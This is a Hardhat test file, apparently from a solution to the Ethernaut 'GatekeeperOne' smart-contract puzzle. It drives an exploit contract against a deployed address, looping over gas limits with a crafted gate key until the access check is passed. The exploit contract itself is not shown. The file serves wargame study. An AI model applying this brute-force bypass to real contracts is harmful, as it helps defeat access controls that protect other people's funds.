import {expect} from 'chai';
import hre from 'hardhat';
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";

describe("Exploit GateKeeperOne", function() {
    var gatekeeperAddress = "0xaEeC6707491248e2a0fcCB3D1767D97551330949";
    async function deployGateKeeper(){

        // const Gatekeeper = await hre.ethers.getContractFactory("GatekeeperOne");
        const GatekeeperExploiter = await hre.ethers.getContractFactory("GatekeeperOneExploit")

        // const gateKeeper = await Gatekeeper.deploy();
        // const gatekeeperAddress = await gateKeeper.address

        const Gatekeeper = await hre.ethers.getContractFactory("GatekeeperOne");
        const gatekeeper = await Gatekeeper.attach(gatekeeperAddress);

        const gatekeeperExploiter = await GatekeeperExploiter.deploy(gatekeeperAddress);


        return {gatekeeper, gatekeeperExploiter}
    }

    it("Should have the address of the owner set to the creator", async () => {
        const {gatekeeper, gatekeeperExploiter} = await loadFixture(deployGateKeeper);
        const [owner] = await hre.ethers.getSigners();
        expect(await gatekeeperExploiter.ownerAddress()).to.equal(owner.address)
    })

    it("Should have set the victim address to the exploit contract", async () => {
        const {gatekeeper, gatekeeperExploiter} = await loadFixture(deployGateKeeper);
        const victimAddress = await gatekeeperExploiter.victim();
        expect(victimAddress).to.equal(gatekeeperAddress);
    })
    
    it("Should be able to exploit the gateKeeperOne contract", async () => {
        const {gatekeeper, gatekeeperExploiter} = await loadFixture(deployGateKeeper);

        const [owner] = await hre.ethers.getSigners();

        let gasCost = 2997288;
        while(true){
            try{
                // const isEntered = await gatekeeperExploiter.functions.exploit("0x1000000000002daa", {gasLimit: gasCost});
                var isEntered = await gatekeeperExploiter.functions.exploit("0x1000000000002266", {gasLimit: gasCost});
                break;
            }catch{
                gasCost -= 1;
                console.log(gasCost);
            }
        }
        expect(await gatekeeper.entrant()).to.equal(owner.address);
    })
})